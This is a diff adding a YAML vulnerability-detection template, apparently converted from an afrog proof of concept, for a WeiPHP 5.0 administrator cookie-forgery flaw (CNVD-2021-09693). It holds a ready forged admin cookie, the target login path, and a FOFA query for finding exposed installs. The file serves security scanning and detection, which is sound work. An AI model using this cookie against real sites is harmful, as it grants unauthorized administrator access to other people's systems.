@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - headers:
+      cookie: user_id=MDAwMDAwMDAwMLK2onQ
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 客户端管理
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/public/index.php/home/user/login/from/6/pbid/0'
+id: CNVD-2021-09693
+info:
+  author: daffainfo
+  description: "Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie \nfofa: app=\"WeiPHP\""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: WeiPHP5.0 任意用户Cookie伪造
+  severity: critical
+  tags: cnvd,cnvd2021,weephp,argus-import
